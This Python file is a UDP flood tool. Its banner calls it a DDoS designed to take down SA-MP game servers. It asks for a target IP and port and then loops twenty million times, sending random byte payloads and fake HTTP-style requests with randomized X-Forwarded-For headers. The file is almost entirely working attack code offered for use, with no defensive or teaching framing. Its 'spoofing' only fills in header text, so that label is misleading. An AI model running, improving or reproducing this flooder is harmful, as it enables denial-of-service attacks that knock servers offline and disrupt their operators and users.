import threading 
import socket
import time as clock
import sys
import socket
import random

def spoofer1():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled
   
def spoofer2():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled  

def spoofer3():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled    

    
byte1 = random._urandom(1024)
tm = """

        RE SAMP DDOS DESIGNED TO DOWN SAMP SERVER
        [BETA] JUST 5% VERSION [UPDATE AT 10/09/2023]
        OWNER : IREL (@N1ckloo)
"""

def UDP():
        global byte1
        global time
        ip = str(input("IP : "))
        port = int(input("PORT : "))
        connection = "Connection: Keep-Alive\r\n"
        connection += "Cache-Control: max-age=0\r\n"
        connection2 = "Connection: Keep-Alive\r\n"
        connection2 += "Cache-Control: max-age=0\r\n"
        connection3 = "Connection: Keep-Alive\r\n"
        connection3 += "Cache-Control: max-age=0\r\n"
        connection += "pragma: no-cache\r\n"
        connection += "X-Forwarded-For: " + spoofer1() + "\r\n"
        connection2 += "X-Forwarded-For: " + spoofer2() + "\r\n"
        connection3 += "X-Forwarded-For: " + spoofer3() + "\r\n"
        connect = "Connection : keep-Alive\r\n\r\n"
        get_rand = random.choice(['GET','POST',"HEAD"])
        get_host = "GET /Attacked-RR/1.1\r\nHost: " + ip + "\r\n"
        request = get_host + connect + connection + get_rand + "\r\n"
        for x in range(20000000):
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect((ip,port))
                s.send(byte1)
                s.send(byte1)
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                print("[SLOT IP1] REQUEST SENDED", [connection])
                print("SENDED IP1 = ", [x])
                print("[SLOT IP2] REQUEST SENDED", [connection2])
                print("SENDED IP2 = ", [x])
                print("[SLOT IP3] REQUEST SENDED", [connection3])
                print("SENDED IP3 = ", [x])

                
def main():
    global tm 
    
    print(tm)
    UDP()
main()